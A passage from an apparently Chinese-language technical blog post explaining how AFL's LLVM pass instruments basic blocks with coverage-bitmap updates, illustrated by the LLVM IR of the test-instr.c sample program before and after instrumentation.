__attribute__\(\(visibility\(\&quot;default\&quot;\)\)\) void _I\(void\) __asm__\(\&quot;__afl_manual_init\&quot;\); _I\(\); \&#125; while \(0\)&quot;</span> /home/wutang/Desktop/google_afl/afl-llvm-rt.o</span><br><span class="line"></span><br><span class="line">gdb-pwndbg /usr/bin/clang</span><br></pre></td></tr></table></figure>

<ul>
<li>afl-llvm-pass.so<ul>
<li><code>AFLCoverage::runOnModule</code></li>
<li>获取环境变量 <code>AFL_INST_RATIO</code><ul>
<li>作为 inst_ratio</li>
</ul>
</li>
<li>创建全局变量 <code>__afl_area_ptr</code> AFLMapPtr  <code>__afl_prev_loc</code>AFLPrevLoc<ul>
<li>分别用于指向 AFL 的共享内存区域和上一个位置。</li>
</ul>
</li>
<li>2的16次方&#x3D;65536 取随机数<ul>
<li><code>unsigned int cur_loc = AFL_R(MAP_SIZE);</code></li>
</ul>
</li>
<li>将之前加载的值 <code>PrevLoc</code> 进行零扩展，转换为一个更大的整数类型。这里使用 <code>getInt32Ty()</code> 是为了将之前加载的值转换为 32 位整数类型。</li>
<li>遍历函数和基本块，为每个基本块插入 AFL 插桩代码。通过计算随机数和插桩比例，确定是否要在当前基本块插入插桩代码。插桩代码会更新覆盖地图（bitmap）。</li>
<li>输出插桩结果，显示已插桩的基本块数量和插桩模式等信息</li>
</ul>
</li>
<li>总的来说就是通过遍历每个基本块，向其中插入实现了如下伪代码功能的instruction ir来进行插桩。</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;;   </span><br><span class="line">shared_mem[cur_location ^ prev_location]++;   </span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">cur_location = &lt;COMPILE_TIME_RANDOM&gt;</span><br><span class="line">__afl_area_ptr[cur_location ^ __afl_prev_loc]++</span><br><span class="line">__afl_prev_loc = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h4 id="test-instr-c插桩前后IR对比"><a href="#test-instr-c插桩前后IR对比" class="headerlink" title="test-instr.c插桩前后IR对比"></a>test-instr.c插桩前后IR对比</h4><ul>
<li>将pass加入clang passmanager 即可调试pass</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">8</span>) &lt; <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hum?\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Looks like a zero to me!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A non-zero value? How quaint!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>插桩前的ir</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;nopt_test-instr.ll&#x27;</span>  </span><br><span class="line">source_filename = <span class="string">&quot;test-instr.c&quot;</span>  </span><br><span class="line">target datalayout = <span class="string">&quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span>  </span><br><span class="line">target triple = <span class="string">&quot;x86_64-apple-macosx10.15.0&quot;</span>  </span><br><span class="line">  </span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">6</span> x i8] c<span class="string">&quot;Hum?\0A\00&quot;</span>, align <span class="number">1</span>  </span><br><span class="line">@.str<span class="number">.1</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">26</span> x i8] c<span class="string">&quot;Looks like a zero to me!\0A\00&quot;</span>, align <span class="number">1</span>  </span><br><span class="line">@.str<span class="number">.2</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">31</span> x i8] c<span class="string">&quot;A non-zero value? How quaint!\0A\00&quot;</span>, align <span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">; Function Attrs: noinline nounwind ssp uwtable  </span><br><span class="line">define i32 @<span class="built_in">main</span>(i32 %<span class="number">0</span>, i8** %<span class="number">1</span>) #<span class="number">0</span> &#123;  </span><br><span class="line">  %<span class="number">3</span> = alloca [<span class="number">8</span> x i8], align <span class="number">1</span>  </span><br><span class="line">  %<span class="number">4</span> = getelementptr inbounds [<span class="number">8</span> x i8], [<span class="number">8</span> x i8]* %<span class="number">3</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>  </span><br><span class="line">  %<span class="number">5</span> = call i64 @<span class="string">&quot;\01_read&quot;</span>(i32 <span class="number">0</span>, i8* %<span class="number">4</span>, i64 <span class="number">8</span>)  </span><br><span class="line">  %<span class="number">6</span> = icmp slt i64 %<span class="number">5</span>, <span class="number">1</span>  </span><br><span class="line">  br i1 %<span class="number">6</span>, label %<span class="number">7</span>, label %<span class="number">9</span>  </span><br><span class="line">  </span><br><span class="line"><span class="number">7</span>:                                                ; preds = %<span class="number">2</span>  </span><br><span class="line">  %<span class="number">8</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">6</span> x i8], [<span class="number">6</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>))  </span><br><span class="line">  call <span class="type">void</span> @<span class="built_in">exit</span>(i32 <span class="number">1</span>) #<span class="number">3</span>  </span><br><span class="line">  unreachable  </span><br><span class="line">  </span><br><span class="line"><span class="number">9</span>:                                                ; preds = %<span class="number">2</span>  </span><br><span class="line">  %<span class="number">10</span> = getelementptr inbounds [<span class="number">8</span> x i8], [<span class="number">8</span> x i8]* %<span class="number">3</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>  </span><br><span class="line">  %<span class="number">11</span> = load i8, i8* %<span class="number">10</span>, align <span class="number">1</span>  </span><br><span class="line">  %<span class="number">12</span> = sext i8 %<span class="number">11</span> to i32  </span><br><span class="line">  %<span class="number">13</span> = icmp eq i32 %<span class="number">12</span>, <span class="number">48</span>  </span><br><span class="line">  br i1 %<span class="number">13</span>, label %<span class="number">14</span>, label %<span class="number">16</span>  </span><br><span class="line">  </span><br><span class="line"><span class="number">14</span>:                                               ; preds = %<span class="number">9</span>  </span><br><span class="line">  %<span class="number">15</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">26</span> x i8], [<span class="number">26</span> x i8]* @.str<span class="number">.1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>))  </span><br><span class="line">  br label %<span class="number">18</span>  </span><br><span class="line">  </span><br><span class="line"><span class="number">16</span>:                                               ; preds = %<span class="number">9</span>  </span><br><span class="line">  %<span class="number">17</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">31</span> x i8], [<span class="number">31</span> x i8]* @.str<span class="number">.2</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>))  </span><br><span class="line">  br label %<span class="number">18</span>  </span><br><span class="line">  </span><br><span class="line"><span class="number">18</span>:                                               ; preds = %<span class="number">16</span>, %<span class="number">14</span>  </span><br><span class="line">  call <span class="type">void</span> @<span class="built_in">exit</span>(i32 <span class="number">0</span>) #<span class="number">3</span>  </span><br><span class="line">  unreachable  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">declare i64 @<span class="string">&quot;\01_read&quot;</span>(i32, i8*, i64) #<span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">declare i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line">; Function Attrs: noreturn  </span><br><span class="line">declare <span class="type">void</span> @<span class="built_in">exit</span>(i32) #<span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind ssp uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;  </span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;  </span><br><span class="line">attributes #<span class="number">2</span> = &#123; noreturn <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;  </span><br><span class="line">attributes #<span class="number">3</span> = &#123; noreturn &#125;  </span><br><span class="line">  </span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>, !<span class="number">1</span>&#125;  </span><br><span class="line">!llvm.ident = !&#123;!<span class="number">2</span>&#125;  </span><br><span class="line">  </span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;  </span><br><span class="line">!<span class="number">1</span> = !&#123;i32 <span class="number">7</span>, !<span class="string">&quot;PIC Level&quot;</span>, i32 <span class="number">2</span>&#125;  </span><br><span class="line">!<span class="number">2</span> = !&#123;!<span class="string">&quot;clang version 10.0.0 &quot;</span>&#125;  </span><br></pre></td></tr></table></figure>

<ul>
<li>插桩后的ir</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">; ModuleID = <span class="string">&#x27;m2r_nopt_test-instr.ll&#x27;</span>\</span><br><span class="line">source_filename = <span class="string">&quot;test-instr.c&quot;</span>\</span><br><span class="line">target datalayout = <span class="string">&quot;e-m:o-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span>\</span><br><span class="line">target triple = <span class="string">&quot;x86_64-apple-macosx10.15.0&quot;</span></span><br><span class="line"></span><br><span class="line">@.str = <span class="keyword">private</span> unnamed_addr constant [<span class="number">6</span> x i8] c<span class="string">&quot;Hum?\0A\00&quot;</span>, align <span class="number">1</span>\</span><br><span class="line">@.str<span class="number">.1</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">26</span> x i8] c<span class="string">&quot;Looks like a zero to me!\0A\00&quot;</span>, align <span class="number">1</span>\</span><br><span class="line">@.str<span class="number">.2</span> = <span class="keyword">private</span> unnamed_addr constant [<span class="number">31</span> x i8] c<span class="string">&quot;A non-zero value? How quaint!\0A\00&quot;</span>, align <span class="number">1</span>\</span><br><span class="line">@__afl_area_ptr = external global i8*\</span><br><span class="line">@__afl_prev_loc = external <span class="keyword">thread_local</span> global i32</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind ssp uwtable\</span><br><span class="line">define i32 @<span class="built_in">main</span>(i32 %<span class="number">0</span>, i8** %<span class="number">1</span>) #<span class="number">0</span> &#123;\</span><br><span class="line">%<span class="number">3</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">4</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">5</span> = <span class="keyword">xor</span> i32 %<span class="number">3</span>, <span class="number">17767</span>\</span><br><span class="line">%<span class="number">6</span> = getelementptr i8, i8* %<span class="number">4</span>, i32 %<span class="number">5</span>\</span><br><span class="line">%<span class="number">7</span> = load i8, i8* %<span class="number">6</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">8</span> = add i8 %<span class="number">7</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">8</span>, i8* %<span class="number">6</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">8883</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">9</span> = alloca [<span class="number">8</span> x i8], align <span class="number">1</span>\</span><br><span class="line">%<span class="number">10</span> = getelementptr inbounds [<span class="number">8</span> x i8], [<span class="number">8</span> x i8]* %<span class="number">9</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>\</span><br><span class="line">%<span class="number">11</span> = call i64 @<span class="string">&quot;\01_read&quot;</span>(i32 <span class="number">0</span>, i8* %<span class="number">10</span>, i64 <span class="number">8</span>)\</span><br><span class="line">%<span class="number">12</span> = icmp slt i64 %<span class="number">11</span>, <span class="number">1</span>\</span><br><span class="line">br i1 %<span class="number">12</span>, label %<span class="number">13</span>, label %<span class="number">21</span></span><br><span class="line"></span><br><span class="line"><span class="number">13</span>:                                               ; preds = %<span class="number">2</span>\</span><br><span class="line">%<span class="number">14</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">15</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">16</span> = <span class="keyword">xor</span> i32 %<span class="number">14</span>, <span class="number">9158</span>\</span><br><span class="line">%<span class="number">17</span> = getelementptr i8, i8* %<span class="number">15</span>, i32 %<span class="number">16</span>\</span><br><span class="line">%<span class="number">18</span> = load i8, i8* %<span class="number">17</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">19</span> = add i8 %<span class="number">18</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">19</span>, i8* %<span class="number">17</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">4579</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">20</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">6</span> x i8], [<span class="number">6</span> x i8]* @.str, i64 <span class="number">0</span>, i64 <span class="number">0</span>))\</span><br><span class="line">call <span class="type">void</span> @<span class="built_in">exit</span>(i32 <span class="number">1</span>) #<span class="number">3</span>\</span><br><span class="line">unreachable</span><br><span class="line"></span><br><span class="line"><span class="number">21</span>:                                               ; preds = %<span class="number">2</span>\</span><br><span class="line">%<span class="number">22</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">23</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">24</span> = <span class="keyword">xor</span> i32 %<span class="number">22</span>, <span class="number">39017</span>\</span><br><span class="line">%<span class="number">25</span> = getelementptr i8, i8* %<span class="number">23</span>, i32 %<span class="number">24</span>\</span><br><span class="line">%<span class="number">26</span> = load i8, i8* %<span class="number">25</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">27</span> = add i8 %<span class="number">26</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">27</span>, i8* %<span class="number">25</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">19508</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">28</span> = getelementptr inbounds [<span class="number">8</span> x i8], [<span class="number">8</span> x i8]* %<span class="number">9</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>\</span><br><span class="line">%<span class="number">29</span> = load i8, i8* %<span class="number">28</span>, align <span class="number">1</span>\</span><br><span class="line">%<span class="number">30</span> = sext i8 %<span class="number">29</span> to i32\</span><br><span class="line">%<span class="number">31</span> = icmp eq i32 %<span class="number">30</span>, <span class="number">48</span>\</span><br><span class="line">br i1 %<span class="number">31</span>, label %<span class="number">32</span>, label %<span class="number">40</span></span><br><span class="line"></span><br><span class="line"><span class="number">32</span>:                                               ; preds = %<span class="number">21</span>\</span><br><span class="line">%<span class="number">33</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">34</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">35</span> = <span class="keyword">xor</span> i32 %<span class="number">33</span>, <span class="number">18547</span>\</span><br><span class="line">%<span class="number">36</span> = getelementptr i8, i8* %<span class="number">34</span>, i32 %<span class="number">35</span>\</span><br><span class="line">%<span class="number">37</span> = load i8, i8* %<span class="number">36</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">38</span> = add i8 %<span class="number">37</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">38</span>, i8* %<span class="number">36</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">9273</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">39</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">26</span> x i8], [<span class="number">26</span> x i8]* @.str<span class="number">.1</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>))\</span><br><span class="line">br label %<span class="number">48</span></span><br><span class="line"></span><br><span class="line"><span class="number">40</span>:                                               ; preds = %<span class="number">21</span>\</span><br><span class="line">%<span class="number">41</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">42</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">43</span> = <span class="keyword">xor</span> i32 %<span class="number">41</span>, <span class="number">56401</span>\</span><br><span class="line">%<span class="number">44</span> = getelementptr i8, i8* %<span class="number">42</span>, i32 %<span class="number">43</span>\</span><br><span class="line">%<span class="number">45</span> = load i8, i8* %<span class="number">44</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">46</span> = add i8 %<span class="number">45</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">46</span>, i8* %<span class="number">44</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">28200</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">47</span> = call <span class="built_in">i32</span> (i8*, ...) @<span class="built_in">printf</span>(i8* getelementptr <span class="built_in">inbounds</span> ([<span class="number">31</span> x i8], [<span class="number">31</span> x i8]* @.str<span class="number">.2</span>, i64 <span class="number">0</span>, i64 <span class="number">0</span>))\</span><br><span class="line">br label %<span class="number">48</span></span><br><span class="line"></span><br><span class="line"><span class="number">48</span>:                                               ; preds = %<span class="number">40</span>, %<span class="number">32</span>\</span><br><span class="line">%<span class="number">49</span> = load i32, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">50</span> = load i8*, i8** @__afl_area_ptr, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">51</span> = <span class="keyword">xor</span> i32 %<span class="number">49</span>, <span class="number">23807</span>\</span><br><span class="line">%<span class="number">52</span> = getelementptr i8, i8* %<span class="number">50</span>, i32 %<span class="number">51</span>\</span><br><span class="line">%<span class="number">53</span> = load i8, i8* %<span class="number">52</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">%<span class="number">54</span> = add i8 %<span class="number">53</span>, <span class="number">1</span>\</span><br><span class="line">store i8 %<span class="number">54</span>, i8* %<span class="number">52</span>, !nosanitize !<span class="number">3</span>\</span><br><span class="line">store i32 <span class="number">11903</span>, i32* @__afl_prev_loc, !nosanitize !<span class="number">3</span>\</span><br><span class="line">call <span class="type">void</span> @<span class="built_in">exit</span>(i32 <span class="number">0</span>) #<span class="number">3</span>\</span><br><span class="line">unreachable\</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare i64 @<span class="string">&quot;\01_read&quot;</span>(i32, i8*, i64) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">declare i32 @<span class="built_in">printf</span>(i8*, ...) #<span class="number">1</span></span><br><span class="line"></span><br><span class="line">; Function Attrs: noreturn\</span><br><span class="line">declare <span class="type">void</span> @<span class="built_in">exit</span>(i32) #<span class="number">2</span></span><br><span class="line"></span><br><span class="line">attributes #<span class="number">0</span> = &#123; noinline nounwind ssp uwtable <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;min-legal-vector-width&quot;</span>=<span class="string">&quot;0&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-jump-tables&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;\</span><br><span class="line">attributes #<span class="number">1</span> = &#123; <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;\</span><br><span class="line">attributes #<span class="number">2</span> = &#123; noreturn <span class="string">&quot;correctly-rounded-divide-sqrt-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;disable-tail-calls&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;frame-pointer&quot;</span>=<span class="string">&quot;all&quot;</span> <span class="string">&quot;less-precise-fpmad&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-infs-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-nans-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-signed-zeros-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;no-trapping-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;stack-protector-buffer-size&quot;</span>=<span class="string">&quot;8&quot;</span> <span class="string">&quot;target-cpu&quot;</span>=<span class="string">&quot;penryn&quot;</span> <span class="string">&quot;target-features&quot;</span>=<span class="string">&quot;+cx16,+cx8,+fxsr,+mmx,+sahf,+sse,+sse2,+sse3,+sse4.1,+ssse3,+x87&quot;</span> <span class="string">&quot;unsafe-fp-math&quot;</span>=<span class="string">&quot;false&quot;</span> <span class="string">&quot;use-soft-float&quot;</span>=<span class="string">&quot;false&quot;</span> &#125;\</span><br><span class="line">attributes #<span class="number">3</span> = &#123; noreturn &#125;</span><br><span class="line"></span><br><span class="line">!llvm.<span class="keyword">module</span>.flags = !&#123;!<span class="number">0</span>, !<span class="number">1</span>&#125;\</span><br><span class="line">!llvm.ident = !&#123;!<span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line">!<span class="number">0</span> = !&#123;i32 <span class="number">1</span>, !<span class="string">&quot;wchar_size&quot;</span>, i32 <span class="number">4</span>&#125;\</span><br><span class="line">!<span class="number">1</span> = !&#123;i32 <span class="number">7</span>, !<span class="string">&quot;PIC Level&quot;</span>, i32 <span class="number">2</span>&#125;\</span><br><span class="line">!<span class="number">2</span> = !&#123;!<span class="string">&quot;clang version 10.0.0 &quot;</span>&#125;\</span><br><span class="line">!<span class="number">3</span> = !&#123;&#125;</span><br></pre></td></tr></table></figure>

